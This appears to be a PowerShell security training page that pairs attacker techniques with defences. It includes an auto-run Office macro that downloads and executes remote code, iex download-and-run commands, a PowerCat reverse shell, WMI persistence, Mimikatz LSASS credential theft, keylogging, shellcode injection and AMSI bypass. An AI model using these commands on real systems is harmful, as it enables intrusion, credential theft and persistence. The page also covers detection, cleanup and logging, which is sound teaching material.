---
ref: cmap-powershell
title: CMAP Module 6 - Empowering the PowerShell
date: 2022-10-25T00:00:00+00:00
layout: page
lang: en
permalink: /en/powershell/
sitemap: false
---

## Hackers and PowerShell - Power(S)Hell

### Basic Techniques

#### Encoded Commands

```powershell
$payload = {
    Write-Host 'Hello World!'
}

$encodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))

"powershell.exe -EncodedCommand $encodedPayload" | Set-Clipboard
```

#### Running Scripts from Web

```powershell
# PowerShell 2
Invoke-Expression (New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1')

# PowerShell 3+ with aliases
iex (iwr 'https://community.chocolatey.org/install.ps1' -UseBasicParsing)
```

#### P/Invoke

- [GetPrivateProfileString MSDN](https://msdn.microsoft.com/en-us/library/windows/desktop/ms724353(v=vs.85).aspx?f=255&MSPPError=-2147217396)
- [GetPrivateProfileString PInvoke.NET](https://www.pinvoke.net/default.aspx/kernel32.GetPrivateProfileString)
- [SysInternals Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)

```powershell
# Create signature
$signature = @'
[DllImport("kernel32.dll")]
public static extern uint GetPrivateProfileString(
    string lpAppName,
    string lpKeyName,
    string lpDefault,
    StringBuilder lpReturnedString,
    uint nSize,
    string lpFileName);
'@

# Compile
Add-Type -MemberDefinition $signature `
         -Name INIFile `
         -Namespace Win32Utils `
         -Using System.Text

# Wrap as PowerShell function
function Get-PrivateProfileString
{
    param(
        [string] $File,
        [string] $Category,
        [string] $Key
    )
    $builder = [System.Text.StringBuilder]::new(1024)
    $result = [Win32Utils.INIFile]::GetPrivateProfileString($category, $key, "", $builder, $builder.Capacity, $file)
    return $builder.ToString() 
}

# call the function
Get-Content 'C:\Windows\System32\GroupPolicy\gpt.ini'
Get-PrivateProfileString -File 'C:\Windows\System32\GroupPolicy\gpt.ini' `
                         -Category General `
                         -Key Version
```

### Office Macros

#### PowerShell Autorun from Macro
```vb
' Word Compatibility
Sub Auto_Open()
    Dim exec As String
    cmd = "powershell.exe ""Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://bit.ly/e0Mw9w'))"""
    Shell (cmd)
End Sub

' PowerPoint Compatibility
Sub AutoOpen()
    Auto_Open
End Sub

' Excel Compatibility
Sub Workbook_Open()
    Auto_Open
End Sub
```

#### Macro Document Generator
```powershell
# Import the Out-Word cmdlet from the Nishang module
iex(iwr 'https://raw.githubusercontent.com/samratashok/nishang/master/Client/Out-Word.ps1')
 
# Create payload
$payload = "powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c Get-Process"

# Generate a Word document
$path = Join-Path (Resolve-Path .) 'Invoice.doc'
Out-Word -Payload $payload -OutputFile $path
```

### WMI Persistence

#### Create

```powershell
$payload = {
    Get-Date >> C:\test.txt
}

$encodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))

$command = "powershell.exe -EncodedCommand $encodedPayload"

$timer = Set-WmiInstance -Class __IntervalTimerInstruction -Arguments @{
    IntervalBetweenEvents = ([UInt32] 10000)
    SkipIfPassed = $False
    TimerId = 'PayloadTrigger'
}

$filter = Set-WmiInstance -Class __EventFilter -Namespace root/subscription -Arguments @{
    EventNamespace = 'root/cimv2'
    Name = 'TimerTrigger'
    Query = "SELECT * FROM __TimerEvent WHERE TimerID = 'PayloadTrigger'"
    QueryLanguage = 'WQL'
}

$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root/subscription -Arguments @{
    Name = 'ExecuteEvilPowerShell'
    CommandLineTemplate = $command
}

$binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root/subscription -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
```

#### Detect

- [WMI Explorer](https://github.com/vinaypamnani/wmie2)
- [Sysinternals Autoruns](https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns)

#### Cleanup

```powershell
$consumer = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'ExecuteEvilPowerShell'"
$filter = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'TimerTrigger'"
$binding = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($consumer.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"
$timer = Get-WmiObject -Namespace root/cimv2 -Class __IntervalTimerInstruction -Filter "TimerId = 'PayloadTrigger'"

Remove-WmiObject -InputObject $binding
Remove-WmiObject -InputObject $consumer
Remove-WmiObject -InputObject $filter
Remove-WmiObject -InputObject $timer
```

### Remote Command Execution

#### PowerShell Remoting

[Running Remote Commands](https://learn.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands)

```powershell
Invoke-Command -ComputerName dc -ScriptBlock { calc.exe }
```

#### WMI

[Create method of the Win32_Process class](https://learn.microsoft.com/en-us/windows/win32/cimwin32prov/create-method-in-class-win32-process)

```powershell
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList calc.exe
```

[Defender ASR: Block process creations originating from PSExec and WMI commands](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide#block-process-creations-originating-from-psexec-and-wmi-commands)

#### Reverse TCP Shell with PowerCat

[PowerCat GitHub](https://github.com/besimorhino/powercat)

```powershell
# Load PowerCat
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')

# Start listener
powercat -l -p 8000

# Start client
powercat -c 10.0.0.1 -p 8000

# Start client and execute PowerShell commands
powercat -c 10.0.0.1 -p 8000 -ep
```

#### PowerShell dnscat2 Client

[dnscat2 GitHub](https://github.com/lukebaggett/dnscat2-powershell)

### Sample Malicious Actions

#### Clipboard Monitoring

> Works with RDP, too.

```powershell
1..100 | % { Get-Clipboard -Format Text; Start-Sleep -Seconds 3 }
```

#### Naïve Credential Phishing

```powershell
do
{
    $cred = Get-Credential -Message 'Provide credentials to continue...' -UserName $env:USERNAME
} until($null -ne $cred -and $null -ne $cred.Password)

Write-Host ('The password is "{0}"!' -f $cred.GetNetworkCredential().Password)
```

#### Keylogger

[PowerSploit GitHub](https://github.com/PowerShellMafia/PowerSploit)

```powershell
Get-Keystrokes -LogPath keystrokes.txt -Timeout 1 -PassThru
```

#### Audio Recording from Microphone

[PowerSploit GitHub](https://github.com/PowerShellMafia/PowerSploit)

```powershell
Get-MicrophoneAudio -Length 10 -Path audio.wav
```

#### Taking Screenshots

[PowerSploit GitHub](https://github.com/PowerShellMafia/PowerSploit)

```powershell
Enable-WindowsOptionalFeature -FeatureName NetFx3 -Online
Get-TimedScreenshot -Path . -Interval 10 -EndTime 14:00
```

#### Stealing Sensitive Files

[PowerSploit GitHub](https://github.com/PowerShellMafia/PowerSploit)

```powershell
Invoke-NinjaCopy -Path c:\windows\system32\config\system -LocalDestination .\system -Verbose
```

#### LSASS Credential Theft #1

[PowerSploit GitHub](https://github.com/PowerShellMafia/PowerSploit)

```powershell
Invoke-Mimikatz -DumpCreds # -ComputerName PC2
Invoke-Mimikatz -Command 'sekurlsa::krbtgt' -ComputerName PC2
```

#### LSASS Credential Theft #2

[Mimikatz](https://github.com/gentilkiwi/mimikatz/releases)

```powershell
Get-Process -Name lsass | Out-Minidump -DumpFilePath .
```

```cmd
mimikatz.exe "sekurlsa::minidump lsass_560.dmp" sekurlsa::logonPasswords quit
```

#### LSASS Credential Theft #3

[PowerMemory](https://github.com/giMini/PowerMemory)

```powershell
.\Reveal-MemoryCredentials.ps1
```

#### Extract WiFi Passwords

[Get-WLANKeys](https://github.com/samratashok/nishang/blob/master/Gather/Get-WLAN-Keys.ps1)

#### Shellcode Invocation

[PowerSploit GitHub](https://github.com/PowerShellMafia/PowerSploit)

```powershell
notepad.exe
$target = Get-Process notepad
Invoke-ShellCode -Force -ProcessID $target.Id
```

#### UAC Bypass

```powershell
# No longer Works on Win10 :-(
iex(iwr 'https://raw.githubusercontent.com/samratashok/nishang/master/Escalation/Invoke-PsUACme.ps1')
Invoke-PsUACme -method mmc
```

[UACME](https://github.com/hfiref0x/UACME)

#### Privilege Escalation

[PowerSploit GitHub](https://github.com/PowerShellMafia/PowerSploit)

```powershell
# Returns services with unquoted paths that also have a space in the name
Get-ServiceUnquoted

# Returns services where the current user can write to the service binary path or its config
Get-ModifiableServiceFile

# Returns services the current user can modify
Get-ModifiableService

# Find schtasks with modifiable target files
Get-ModifiableScheduledTaskFile

# Checks for any modifiable binaries/scripts (or their configs) in HKLM autoruns
Get-ModifiableRegistryAutoRun

# Finds potential DLL hijacking opportunities for currently running processes
Find-ProcessDLLHijack
```

[PrivescCheck GitHub](https://github.com/itm4n/PrivescCheck)

#### MITM Attack

```powershell
iex(iwr 'https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1')

Invoke-Inveigh -LLMNR Y -HTTP Y -SMB Y -NBNS Y -StatusOutput Y -ConsoleOutput Y 

Stop-Inveigh
```

#### PowerShell Empire

[PowerShell Empire GitHub](https://github.com/EmpireProject/Empire)

### AMSI Bypass

#### Disable as Admin

Registered providers: `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AMSI`

```powershell
Get-ChildItem -Path 'registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AMSI' -Recurse |
    Where-Object PSChildName -like '{*}' |
    ForEach-Object { Rename-Item -Path $PSItem.PSPath -NewName ($PSItem.PSChildName + '-Disabled' ) }
```

#### Re-Enable as Admin

```powershell
Get-ChildItem -Path 'registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AMSI' -Recurse |
    Where-Object PSChildName -like '*-Disabled' |
    ForEach-Object { Rename-Item -Path $PSItem.PSPath -NewName ($PSItem.PSChildName -replace '-Disabled','') }
```

#### Disable as User

> Note: These methods may be caught by AVs

<https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell>

### Blocking PowerShell Script Execution
#### PowerShell Execution Policy

```powershell
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force

Invoke-Expression (New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1')
```

#### Constrained Language Mode

[Script rules in AppLocker](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/script-rules-in-applocker)

[Device Guard User Mode Code Integrity (UMCI)](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/select-types-of-rules-to-create)


```powershell
$ExecutionContext.SessionState.LanguageMode

$ExecutionContext.SessionState.LanguageMode = [System.Management.Automation.PSLanguageMode]::ConstrainedLanguage

[System.Console]::WriteLine('Hello')
```

#### PowerShell JEA

[Just Enough Administration](https://learn.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/overview)

### Auditing PowerShell

#### Script Execution Logging


[Script Tracing and Logging](https://docs.microsoft.com/en-us/powershell/wmf/5.0/audit_script)

[PowerShell 5 Logging](https://www.rootusers.com/enable-and-configure-module-script-block-and-transcription-logging-in-windows-powershell/)[  
<img class="aligncenter" src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/dunwoody%20powershell/figure_2.png" alt="" width="501" height="319" />](https://www.fireeye.com/content/dam/fireeye-www/blog/images/dunwoody%20powershell/figure_2.png) 


#### PSReadline Command History

#### Remoting Sessions

#### Microsoft Defender for Endpoint

## Active Directory Security Assessment

### Operating System Versions

### Kerberoasting

### SID History

### Shadow Credentials

### Password Quality

### Event Logs


## Desired State Configuration

### Domain Controller Security Baselines


### CIS Checklists
## Pester

## Unattended Scripts

### Scheduled Tasks

### Managed Service Accounts

### Script Credentials

### Azure AD Credentials
